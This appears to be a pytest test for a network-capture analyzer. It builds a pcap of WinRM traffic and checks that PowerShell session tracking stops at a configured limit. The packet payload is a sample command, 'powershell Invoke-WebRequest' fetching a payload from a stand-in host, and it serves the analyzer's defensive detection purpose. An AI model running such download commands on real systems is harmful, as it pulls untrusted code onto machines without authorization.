from __future__ import annotations

from scapy.all import Ether, IP, Raw, TCP, wrpcap

import pcapper.powershell as powershell


def test_powershell_session_tracking_is_bounded_and_reported(tmp_path, monkeypatch) -> None:
    capture = tmp_path / "powershell_sessions.pcap"
    payload = b"powershell Invoke-WebRequest http://example.test/payload"
    wrpcap(
        str(capture),
        [
            Ether()
            / IP(src="10.0.0.1", dst="10.0.0.2")
            / TCP(sport=50000, dport=5985)
            / Raw(load=payload),
            Ether()
            / IP(src="10.0.0.1", dst="10.0.0.2")
            / TCP(sport=50001, dport=5985)
            / Raw(load=payload),
        ],
    )
    monkeypatch.setattr(powershell, "MAX_POWERSHELL_SESSIONS", 1)

    result = powershell.analyze_powershell(capture, show_status=False)

    assert result.total_sessions == 1
    assert any("session limit reached" in error for error in result.errors)
